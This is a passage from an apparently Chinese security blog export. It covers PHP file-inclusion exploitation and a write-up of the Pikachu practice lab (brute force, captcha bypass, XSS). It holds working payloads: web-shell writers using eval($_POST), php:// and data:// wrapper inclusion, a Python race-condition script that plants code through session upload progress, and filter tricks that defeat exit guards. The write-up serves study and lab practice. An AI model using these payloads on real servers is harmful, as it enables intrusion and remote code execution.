<li><p>通过phpinfo的信息可以获取到session的存储位置 如下👇</p>
<p>​    通过phpinfo的信息，获取到session.save_path为/var/lib/php/session：</p>
</li>
</ol>
<p><img src="https://img.vim-cn.com/e8/4552334a0f0ec9ca88052c5a60d233e6098e97.png" alt="p2"></p>
<ol start="2">
<li><p>通过猜测默认的session存放位置进行尝试  如下👇</p>
<p>​    如linux下默认存储在/var/lib/php/session目录下</p>
</li>
</ol>
<p>session中的内容可以被控制，传入恶意代码</p>
<p>test代码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">session_start();</span><br><span class="line"><span class="variable">$a</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;aaa&#x27;</span>];</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&quot;username&quot;</span>]=<span class="variable">$a</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>这段代码会将获取到的GET方式传入参数存入到session中</p>
<p><strong>漏洞利用</strong></p>
<p>通过上面的分析，可以知道传入参数会存储在session文件中，若存在本地文件包含漏洞，就可以a变量写入到session文件中，然后通过文件包含漏洞执行恶意代码。</p>
<h4 id="远程文件包含漏洞"><a href="#远程文件包含漏洞" class="headerlink" title="远程文件包含漏洞"></a>远程文件包含漏洞</h4><p>条件：</p>
<ol>
<li>allow_url_fopen = On（是否允许打开远程文件）</li>
<li>allow_url_include = On（是否允许include/require远程文件）</li>
</ol>
<p>无限制远程文件包含漏洞</p>
<p>test代码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$filename</span>  = <span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$filename</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">payload:filename&#x3D;http:&#x2F;&#x2F;xxx.xxx.xxx.xxx&#x2F;phpinfo.txt</span><br><span class="line"></span><br><span class="line">phpinfo.txt:</span><br><span class="line">&lt;?php phpinfo();?&gt;</span><br></pre></td></tr></table></figure>

<p>有限制远程文件包含漏洞</p>
<p>test代码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">include</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>] . <span class="string">&quot;.html&quot;</span>); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>绕过方式：</p>
<ol>
<li>问号绕过  payload：filename=<a href="http://xxx.xxx.xxx.xxx/phpinfo.txt">http://xxx.xxx.xxx.xxx/phpinfo.txt</a>?</li>
<li>#号绕过  payload：filename=<a href="http://xxx.xxx.xxx.xxx/phpinfo.txt%23">http://xxx.xxx.xxx.xxx/phpinfo.txt%23</a></li>
<li>空格绕过 payload：filename=<a href="http://xxx.xxx.xxx.xxx/phpinfo.txt%20">http://xxx.xxx.xxx.xxx/phpinfo.txt%20</a>  </li>
</ol>
<h4 id="关于php伪协议"><a href="#关于php伪协议" class="headerlink" title="关于php伪协议"></a>关于<a href="https://segmentfault.com/a/1190000018991087">php伪协议</a></h4><p><img src="https://ae01.alicdn.com/kf/Hab0f83469c9546fe89dc86301793dc07T.png" alt="image.png"></p>
<h5 id="file"><a href="#file" class="headerlink" title="file://"></a>file://</h5><p>通过file协议可以访问本地文件系统，读取到文件的内容</p>
<p>test:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$filename</span>  = <span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$filename</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">payload:filename&#x3D;file:&#x2F;&#x2F;c:&#x2F;xxx.txt</span><br></pre></td></tr></table></figure>



<h5 id="http"><a href="#http" class="headerlink" title="http://"></a>http://</h5><p>条件</p>
<ol>
<li>受allow_url_fopen限制</li>
</ol>
<p>格式：file=<a href="http://xxx.xxx.xxx.xxx/xxx.xxx">http://xxx.xxx.xxx.xxx/xxx.xxx</a></p>
<h5 id="php"><a href="#php" class="headerlink" title="php://"></a>php://</h5><p>PHP 提供了一些杂项输入/输出（IO）流，允许访问 PHP 的输入输出流、标准输入输出和错误描述符， 内存中、磁盘备份的临时文件流以及可以操作其他读取写入文件资源的过滤器。相关限制条件查看<a href="https://www.php.net/manual/zh/wrappers.php.php">官方文档</a></p>
<h6 id="php-input"><a href="#php-input" class="headerlink" title="php://input"></a>php://input</h6><p><strong>读取POST数据</strong></p>
<p>可以访问请求的原始数据的只读流。即可以直接读取到POST上没有经过解析的原始数据。 enctype=”multipart/form-data” 的时候 php://input 是无效的。</p>
<p>用法：?file=php://input 数据利用POST传过去。</p>
<p>test：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//post.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">echo</span> file_get_contents(<span class="string">&quot;php://input&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>直接访问post.php  然后直接post上传数据即可</p>
<p><strong>写入木马</strong></p>
<p>条件：</p>
<ol>
<li>需同时开启 allow_url_fopen 和 allow_url_include</li>
<li>PHP &lt; 5.3.0</li>
</ol>
<p>test：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$filename</span>  = <span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$filename</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//POST传入</span></span><br><span class="line"><span class="meta">&lt;?PHP</span> fputs(fopen(<span class="string">&#x27;shell.php&#x27;</span>,<span class="string">&#x27;w&#x27;</span>),<span class="string">&#x27;&lt;?php @eval($_POST[cmd])?&gt;&#x27;</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><strong>命令执行</strong></p>
<p>条件：</p>
<ol>
<li>需同时开启 allow_url_fopen 和 allow_url_include</li>
<li>PHP &lt; 5.3.0</li>
</ol>
<p>可以造成任意代码执行，即POST过去PHP代码，即可执行。</p>
<p>test同上</p>
<p>直接post传php代码就可执行</p>
<h6 id="php-filter"><a href="#php-filter" class="headerlink" title="php://filter"></a>php://filter</h6><p>元封装器，设计用于”数据流打开”时的”筛选过滤”应用，对本地磁盘文件进行读写。</p>
<p>条件</p>
<ol>
<li>只是读取，需要开启 allow_url_fopen，不需要开启 allow_url_include</li>
</ol>
<p>用法：?filename=php://filter/convert.base64-encode/resource=xxx.php</p>
<p>或是  ?filename=php://filter/read=convert.base64-encode/resource=xxx.php</p>
<p>参数：👇</p>
<p><img src="https://ae03.alicdn.com/kf/H852d11d3b87f4974a38554413358a4eah.png" alt="image.png"></p>
<h5 id="data-（可以执行php代码）"><a href="#data-（可以执行php代码）" class="headerlink" title="data://（可以执行php代码）"></a>data://（可以执行php代码）</h5><p>数据流封装器，和php://相似都是利用了流的概念，将原本的include的文件流重定向到了用户可控制的输入流中，简单来说就是执行文件的包含方法包含了你的输入流，通过你输入payload来实现目的</p>
<p>例如：data://text/plain;base64,dGhlIHVzZXIgaXMgYWRtaW4</p>
<p>条件：</p>
<ol>
<li>PHP版本5.2，5.3，5.5，7.0；data:// 协议是是受限于allow_url_fopen的，官方文档上给出的是NO，所以要使用data://协议要满足双on条件</li>
</ol>
<p><strong>1、读取文件</strong></p>
<p>和php伪协议的input类似，碰到file_get_contents()来用</p>
<p>如果php.ini里的allow_url_include=On（PHP &lt; 5.3.0）,就可以造成任意代码执行，在这就可以理解成远程文件包含漏洞</p>
<p>test：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$filename</span>  = <span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$filename</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">payload:data:&#x2F;&#x2F;text&#x2F;plain;base64,PD9waHAgcGhwaW5mbygpOw&#x3D;&#x3D;								&#x2F;&#x2F;&lt;?php phpinfo();</span><br></pre></td></tr></table></figure>



<h5 id="zlib"><a href="#zlib" class="headerlink" title="zlib://"></a>zlib://</h5><ol>
<li>zip://, bzip2://, zlib://协议在双off的情况下也可以正常使用</li>
<li>zlib:// ，bzip2:// ，zip:// — 压缩流，可以访问压缩文件中的子文件，而且不需要指定后缀名。配合文件上传来getshell</li>
</ol>
<h6 id="zip"><a href="#zip" class="headerlink" title="zip://"></a>zip://</h6><p>条件： PHP &gt; =5.3.0，注意在windows下测试要5.3.0&lt;PHP&lt;5.4 才可以</p>
<p>使用：zip://[压缩文件绝对路径]#[压缩文件内的子文件名]</p>
<p>注意改后缀以及将#编码为%23</p>
<h6 id="bzip2"><a href="#bzip2" class="headerlink" title="bzip2://"></a>bzip2://</h6><p>compress.bzip2://file.bz2</p>
<p>在compress.bzip2://直接加压缩文件路径，相对绝对都可以</p>
<h6 id="zlib-1"><a href="#zlib-1" class="headerlink" title="zlib://"></a>zlib://</h6><p>使用：compress.zlib://file.gz</p>
<p>在compress.zlib://直接加压缩文件路径，相对绝对都可以</p>
<h5 id="phar"><a href="#phar" class="headerlink" title="phar://"></a>phar://</h5><p>这个参数是就是php解压缩包的一个函数，不管后缀是什么，都会当做压缩包来解压。</p>
<p>用法：?file=phar://压缩包/内部文件 。</p>
<p>注意： PHP &gt; =5.3.0 压缩包需要是zip协议压缩，rar不行，将木马文件压缩后，改为其他任意格式的文件都可以正常使用。 步骤： 写一个一句话木马文件shell.php，然后用zip协议压缩为shell.zip，然后将后缀改为png等其他格式。</p>
<p>test：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$filename</span>  = <span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$filename</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">payload:phar:&#x2F;&#x2F;xxx.png&#x2F;shell.php</span><br></pre></td></tr></table></figure>

<h4 id="包含日志文件getshell"><a href="#包含日志文件getshell" class="headerlink" title="包含日志文件getshell"></a>包含日志文件getshell</h4><p>当没有上传点，并且也没有url_allow_include功能时，我们就可以考虑<strong>包含服务器的日志文件。</strong></p>
<p>原理：当我们访问网站时，服务器的日志中都会记录我们的行为，当我们访问链接中包含PHP一句话木马时，也会被记录到日志中</p>
<p>步骤：</p>
<ol>
<li>找到日志存放位置</li>
<li>用bp或者curl来避免url转码</li>
</ol>
<p>相关细节见<a href="https://www.cnblogs.com/my1e3/p/5854897.html">这里</a></p>
<p>也可修改UA来写入一句话木马</p>
<h4 id="利用session-upload-progress进行文件包含"><a href="#利用session-upload-progress进行文件包含" class="headerlink" title="利用session.upload_progress进行文件包含"></a>利用session.upload_progress进行文件包含</h4><p>这个功能在php5.4添加的需要注意一下版本.</p>
<p>在php.ini有以下几个默认选项</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1. session.upload_progress.enabled &#x3D; on</span><br><span class="line">2. session.upload_progress.cleanup &#x3D; on</span><br><span class="line">3. session.upload_progress.prefix &#x3D; &quot;upload_progress_&quot;</span><br><span class="line">4. session.upload_progress.name &#x3D; &quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span><br><span class="line">5. session.upload_progress.freq &#x3D; &quot;1%&quot;</span><br><span class="line">6. session.upload_progress.min_freq &#x3D; &quot;1&quot;</span><br></pre></td></tr></table></figure>

<p>这里，我们只需要了解前四个配置选项即可</p>
<blockquote>
<p><code>enabled=on</code>表示<code>upload_progress</code>功能开始，也意味着当浏览器向服务器上传一个文件时，php将会把此次文件上传的详细信息(如上传时间、上传进度等)存储在session当中 ；</p>
<p><code>cleanup=on</code>表示当文件上传结束后，php将会立即清空对应session文件中的内容，这个选项非常重要；</p>
<p><code>name</code>当它出现在表单中，php将会报告上传进度，最大的好处是，它的值可控；</p>
<p><code>prefix+name</code>将表示为session中的键名</p>
</blockquote>
<p>test环境：</p>
<ul>
<li>php5.5.38</li>
<li>Windows10</li>
<li>关于session的配置为默认值</li>
</ul>
<p>代码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$b</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;<span class="subst">$b</span>&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>可以发现，存在一个文件包含漏洞，但是找不到一个可以包含的恶意文件。其实，我们可以利用<code>session.upload_progress</code>将恶意语句写入session文件，从而包含session文件。前提需要知道session文件的存放位置。</p>
<p>可以看到代码里边并没有session_start() 那么怎么创建session文件呢？如果<code>session.auto_start=On</code> ，则PHP在接收请求的时候会自动初始化Session，不再需要执行session_start()。但默认情况下，这个选项都是关闭的。但session还有一个默认选项，session.use_strict_mode默认值为0。此时用户是可以自己定义Session ID的。比如，我们在Cookie里设置PHPSESSID=T0mr，PHP将会在服务器上创建一个文件：/tmp/sess_T0mr。即使此时用户没有初始化Session，PHP也会自动初始化Session。 并产生一个键值，这个键值有ini.get(“session.upload_progress.prefix”)+由我们构造的session.upload_progress.name值组成，最后被写入sess_文件里。</p>
<p>第二个问题  默认配置<code>session.upload_progress.cleanup = on</code>导致文件上传后，session文件内容立即清空，那怎么才可以进行rce呢</p>
<p>可以利用竞争，在session文件内容清空前进行包含利用。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line">sessid = <span class="string">&#x27;T0mr&#x27;</span></span><br><span class="line">data = &#123;<span class="string">&quot;cmd&quot;</span>:<span class="string">&quot;system(&#x27;whoami&#x27;);&quot;</span>&#125;</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write</span>(<span class="params">session</span>):</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        f = io.BytesIO(<span class="string">b&#x27;a&#x27;</span> * <span class="number">1024</span> * <span class="number">50</span>)</span><br><span class="line">        resp = session.post( <span class="string">&#x27;url&#x27;</span>, data=&#123;<span class="string">&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;</span>: <span class="string">&#x27;&lt;?php eval($_POST[&quot;cmd&quot;]);?&gt;&#x27;</span>&#125;, files=&#123;<span class="string">&#x27;file&#x27;</span>: (<span class="string">&#x27;xxx.txt&#x27;</span>,f)&#125;, cookies=&#123;<span class="string">&#x27;PHPSESSID&#x27;</span>: sessid&#125; )</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read</span>(<span class="params">session</span>):</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        resp = session.post(<span class="string">&#x27;url?file=session/sess_&#x27;</span>+sessid,data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;xxx.txt&#x27;</span> <span class="keyword">in</span> resp.text:</span><br><span class="line">            <span class="built_in">print</span>(resp.text)</span><br><span class="line">            event.clear()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[+++++++++++++]retry&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    event=threading.Event()</span><br><span class="line">    <span class="keyword">with</span> requests.session() <span class="keyword">as</span> session:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">1</span>,<span class="number">30</span>): </span><br><span class="line">            threading.Thread(target=write,args=(session,)).start()</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">1</span>,<span class="number">30</span>):</span><br><span class="line">            threading.Thread(target=read,args=(session,)).start()</span><br><span class="line">    event.<span class="built_in">set</span>()</span><br></pre></td></tr></table></figure>



<h4 id="php-filter绕过死亡代码"><a href="#php-filter绕过死亡代码" class="headerlink" title="php://filter绕过死亡代码"></a>php://filter绕过死亡代码</h4><p>代码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$content</span> = <span class="string">&#x27;&lt;?php exit; ?&gt;&#x27;</span>;</span><br><span class="line"><span class="variable">$content</span> .= <span class="variable">$_POST</span>[<span class="string">&#x27;txt&#x27;</span>];</span><br><span class="line">file_put_contents(<span class="variable">$_POST</span>[<span class="string">&#x27;filename&#x27;</span>], <span class="variable">$content</span>);</span><br></pre></td></tr></table></figure>

<p><code>$content</code>在开头增加了exit过程，导致即使我们成功写入一句话，也执行不了</p>
<h5 id="1、base64"><a href="#1、base64" class="headerlink" title="1、base64"></a>1、base64</h5><p>这里的<code>$_POST[&#39;filename&#39;]</code>是可以控制协议的，我们即可使用 php://filter协议来施展魔法：使用php://filter流的base64-decode方法，将<code>$content</code>解码，利用php base64_decode函数特性去除“死亡exit”。base64编码只包含了64个可打印字符，而PHP在解码base64时，遇到不在其中的字符时，将会跳过这些字符，仅将合法字符组成一个新的字符串进行解码。所有就可以理解为，在php中对base64解码先匹配所有符合base64编码规范的字符在对其进行解码。所以，当<code>$content</code>被加上了<code>&lt;?php exit; ?&gt;</code>以后，我们可以使用 php://filter/write=convert.base64-decode 来首先对其解码。在解码的过程中，字符&lt;、?、;、&gt;、空格等一共有7个字符不符合base64编码的字符范围将被忽略，所以最终被解码的字符仅有“phpexit”和我们传入的其他字符。“phpexit”一共7个字符，因为base64算法解码时是4个byte一组，所以给他增加1个“a”一共8个字符。这样，”phpexita”被正常解码，而后面我们传入的webshell的base64内容也被正常解码。结果就是<code>&lt;?php exit; ?&gt;</code>没有了</p>
<p>传入的<code>payload:txt==aPD9waHAgZXZhbCgkX1BPU1RbJ3gnXSk7Pz4=</code> <code>filename=php://filter/write=convet.base64-decode/resource=shell.php</code></p>
<h5 id="2、strip-tags"><a href="#2、strip-tags" class="headerlink" title="2、strip_tags"></a>2、strip_tags</h5><p>除了使用base64特性的方法外，我们还可以利用php://filter字符串处理方法来去除“死亡exit”。</p>
<p>这个<code>&lt;?php exit; ?&gt;</code>实际上是一个XML标签，既然是XML标签，我们就可以利用strip_tags函数去除它，而php://filter刚好是支持这个方法的。</p>
<p><strong>strip_tags</strong></p>
<ol>
<li>(PHP 4, PHP 5, PHP 7, PHP 8)</li>
<li>strip_tags — 从字符串中去除 HTML 和 PHP 标记</li>
</ol>
<p>php://filter允许使用多个过滤器，我们可以先将webshell用base64编码。在调用完成strip_tags后再进行base64-decode。“死亡exit”在第一步被去除，而webshell在第二步被还原</p>
<p><code>payload:txt=PD9waHAgZXZhbCgkX1BPU1RbJ3gnXSk7Pz4=</code> <code>filename=php://filter/write=string.strip_tags|convert.base64-decode/resource=shell.php</code></p>
<h5 id="3、rot13"><a href="#3、rot13" class="headerlink" title="3、rot13"></a>3、rot13</h5><p>还可以利用rot13编码独立完成任务。原理和上面类似，核心是将“死亡exit”去除。<code>&lt;?php exit; ?&gt;</code>在经过rot13编码后会变成<code>&lt;?cuc rkvg; ?&gt;</code>，在PHP不开启short_open_tag时，php不认识这个字符串，当然也就不会执行了</p>
<p><code>payload:txt=&lt;?cuc rkvg; ?&gt;</code> <code>filename=php://filter/write=string.rot13/resource=shell.php</code></p>
<p>当然，这个方法的条件就是不开启短标签</p>
<p>参考链接：</p>
<p><a href="https://www.freebuf.com/news/182280.html">https://www.freebuf.com/news/182280.html</a></p>
<p><a href="http://www.y2hlbg.top/2021/04/20/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/#post-comment">http://www.y2hlbg.top/2021/04/20/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/#post-comment</a></p>
<p><a href="https://www.cnblogs.com/my1e3/p/5854897.html">https://www.cnblogs.com/my1e3/p/5854897.html</a></p>
<p><a href="https://www.freebuf.com/vuls/202819.html">https://www.freebuf.com/vuls/202819.html</a></p>
]]></content>
      <categories>
        <category>web漏洞</category>
      </categories>
      <tags>
        <tag>文件包含</tag>
      </tags>
  </entry>
  <entry>
    <title>Pikachu靶场漏洞复现记录</title>
    <url>/2021/05/18/pikachu/</url>
    <content><![CDATA[<script src='https://cdn.jsdelivr.net/gh/sviptzk/HexoStaticFile@latest/Hexo/js/mouse_snow.min.js'></script>

<h1 id="暴力破解"><a href="#暴力破解" class="headerlink" title="暴力破解"></a>暴力破解</h1><h2 id="基于表单的暴力破解"><a href="#基于表单的暴力破解" class="headerlink" title="基于表单的暴力破解"></a>基于表单的暴力破解</h2><p><img src="https://img.vim-cn.com/85/6ce77643b8f836338a671fc2d48cfc8af9e0bb.png"></p>
<p>bp抓包，发送到 Intruder模块（快捷键ctrl+i</p>
<p><img src="https://img.vim-cn.com/c2/f54ad79a6cac76cc51be54a00efa92becd6330.png" alt="1"></p>
<p><img src="https://img.vim-cn.com/45/5c65c441cf3a0d43e4b0ec9c2b2e2700940053.png" alt="2"></p>
<p><img src="https://img.vim-cn.com/1b/9b560a9e5d0b9ec16a2a6d02a11a804eb111e7.png" alt="3"></p>
<p>之后点击右上角 start attack（开始爆破</p>
<p><img src="https://img.vim-cn.com/8c/ca0eff454fbaa4d9dfb4500a4fe694c4a23529.png" alt="4"></p>
<h2 id="验证码绕过"><a href="#验证码绕过" class="headerlink" title="验证码绕过"></a>验证码绕过</h2><p>验证码的验证流程一般为：</p>
<ol>
<li>客户端登陆页面，后台生成验证码：后台使用算法生成图片，并将图片返回到客户端；同时将算法生成的值全局赋值存到SESSION中。</li>
<li>校验验证码：客户端将认证信息和验证码一同提交；后台对提交的验证码与SESSION中的进行比较；</li>
<li>客户端重新刷新页面，再次生成新的验证码：验证码算法中一般包含随机函数，所以每次刷新都会改变。</li>
</ol>
<p>判断是否可以进行暴力破解的方法：</p>
<p>账号密码随便输，比较是否输入验证码两种情况系统的提示。</p>
<p>当我们不输入验证码时，会提醒我们输入验证码；</p>
<p>当输入错误的验证码时，会提醒验证码错误。接下来输入正确的验证码，提示用户名或者密码不存在</p>
<h3 id="on-client"><a href="#on-client" class="headerlink" title="on client"></a>on client</h3><p>常见问题：</p>
<ul>
<li>使用前端js来实现验证码。</li>
<li>将验证码在cookie中泄露，容易被获取。</li>
<li>将验证码在前端源代码中泄露，容易被获取。</li>
</ul>
<p><img src="https://img.vim-cn.com/3d/803d8b914ab679933e2b8d3a994db413aa5376.png"></p>
<p>抓包发送到Intruder模块，只将用户名和密码设置为变量，验证码为正确验证码，开始爆破即可</p>
<h3 id="on-server"><a href="#on-server" class="headerlink" title="on server"></a>on server</h3><p>常见问题：</p>
<ul>
<li>验证码在后台不过期，导致长时间可以被使用**.**</li>
<li>验证码校验不严格，逻辑出现问题**.**</li>
<li>验证码设计的太过简单和有规律，容易被猜测**.**</li>
</ul>
<p><img src="https://img.vim-cn.com/6d/74697edb57355f3f95a65903924ebb9e560d2f.png"></p>
<p>确认验证码的有效性。当不输入验证码或者输入验证码错误时，提示验证码不能为空或验证码错误</p>
<p>抓包发送到repeater模块中修改验证码的值，判断后台对验证码是否验证，发现存在验证</p>
<p>使用正确验证码，返回用户名或密码错误，修改用户名或密码的值再次发送，发现仍提示用户名或密码错误，得到结论，验证码存在不过期的问题接下来就直接将用户名密码设为变量爆破就可以了</p>
<h1 id="Cross-Site-Scripting-–-XSS"><a href="#Cross-Site-Scripting-–-XSS" class="headerlink" title="Cross-Site Scripting – XSS"></a>Cross-Site Scripting – XSS</h1><p>危害：存储型 &gt; 反射型 &gt; DOM型</p>
<p>用户访问含有xss漏洞的网站，触发脚本，网站返回用户带有恶意代码的页面，执行脚本，将数据返回给攻击者，攻击者可用伪造用户进行一些操作</p>
<p>反射型：一次性</p>
<p>存储型：恶意代码存储在数据库里边，常见于留言板，注册页面等等</p>
<p>DOM型：不与后台数据库进行交互，通过DOM操作前端代码输出的时候产生的问题，一次性，类似反射型</p>
<p>进行测试XSS漏洞时，可以先传入一些字符来判断是否对输入有过滤</p>
<h2 id="反射型xss-get"><a href="#反射型xss-get" class="headerlink" title="反射型xss( get )"></a>反射型xss( get )</h2><p><img src="https://img.vim-cn.com/f4/4872bdf2a3aca7f0bfcd4df92c5ae27fc00f48.png"></p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;alert(<span class="string">&#x27;xss&#x27;</span>)&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>发现对输入长度有限制，修改长度限制，再次输入，即可触发弹窗.</p>
<p><img src="https://img.vim-cn.com/5d/c54793f8b28a1d956094381770e11ffa1ebccb.png"></p>
<h2 id="反射型xss-post"><a href="#反射型xss-post" class="headerlink" title="反射型xss( post )"></a>反射型xss( post )</h2><p><img src="https://img.vim-cn.com/34/df3d0fe9d4b389dab6ca80989d1b1ed91e6e78.png"></p>
<p>用bp抓包，爆破用户名和密码（也可点击右上角提示）登陆之后</p>
<p>在输入框中输入</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;alert(<span class="string">&#x27;xss&#x27;</span>)&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>可触发弹窗</p>
<h2 id="存储型xss"><a href="#存储型xss" class="headerlink" title="存储型xss"></a>存储型xss</h2><p><img src="https://img.vim-cn.com/c0/5287300170534ff4c119a872a8b485305fcae8.png"></p>
<p>payload👇</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;alert(<span class="string">&#x27;xss&#x27;</span>)&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<h2 id="DOM型xss"><a href="#DOM型xss" class="headerlink" title="DOM型xss"></a>DOM型xss</h2><p><img src="https://img.vim-cn.com/da/028a359d0666622deed8532129730b5b1c9c54.png"></p>
<p><img src="https://img.vim-cn.com/ff/9da34465c173f02d6012738a899ff77cc7a8f8.png"></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;div id=<span class="string">&quot;xssd_main&quot;</span>&gt;</span><br><span class="line">   &lt;script&gt;</span><br><span class="line">      <span class="function"><span class="keyword">function</span> <span class="title">domxss</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">         <span class="keyword">var</span> str = document.getElementById(<span class="string">&quot;text&quot;</span>).value;</span><br><span class="line">         document.getElementById(<span class="string">&quot;dom&quot;</span>).innerHTML = <span class="string">&quot;&lt;a href=&#x27;&quot;</span>+str+<span class="string">&quot;&#x27;&gt;what do you see?&lt;/a&gt;&quot;</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="comment">//试试：&#x27;&gt;&lt;img src=&quot;#&quot; onmouseover=&quot;alert(&#x27;xss&#x27;)&quot;&gt;</span></span><br><span class="line">      <span class="comment">//试试：&#x27; onclick=&quot;alert(&#x27;xss&#x27;)&quot;&gt;,闭合掉就行</span></span><br><span class="line">   &lt;/script&gt;</span><br><span class="line">   &lt;!--&lt;a href=<span class="string">&quot;&quot;</span> onclick=(<span class="string">&#x27;xss&#x27;</span>)&gt;--&gt;</span><br><span class="line">   &lt;input id=<span class="string">&quot;text&quot;</span> name=<span class="string">&quot;text&quot;</span> type=<span class="string">&quot;text&quot;</span>  value=<span class="string">&quot;&quot;</span> /&gt;</span><br><span class="line">   &lt;input id=<span class="string">&quot;button&quot;</span> type=<span class="string">&quot;button&quot;</span> value=<span class="string">&quot;click me!&quot;</span> onclick=<span class="string">&quot;domxss()&quot;</span> /&gt;</span><br><span class="line">   &lt;div id=<span class="string">&quot;dom&quot;</span>&gt;&lt;/div&gt;</span><br><span class="line">&lt;/div&gt;        </span><br></pre></td></tr></table></figure>

<p>可以发现只需要把<code>&lt;a href=&#39;&quot;+str+&quot;&#39;&gt;</code>闭合了，构造payload👇</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">#&#x27; onclick=&quot;alert(&#x27;xss&#x27;)&quot;&gt;  //只需要点击对应的链接即可触发弹窗</span><br><span class="line"></span><br><span class="line">&quot;&#x27;&gt;<span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;#&quot;</span> <span class="attr">onmouseover</span>=<span class="string">&quot;alert(&#x27;xss&#x27;)&quot;</span>&gt;</span> //将鼠标移到对应位置即可触发弹窗</span><br><span class="line">&#x27;&gt;<span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;#&quot;</span> <span class="attr">onmouseover</span>=<span class="string">&quot;alert(&#x27;xss&#x27;)&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">&#x27; onclick=&quot;alert(&#x27;xss&#x27;)&quot;&gt;  //直接在a标签里添加onclick事件</span><br></pre></td></tr></table></figure>

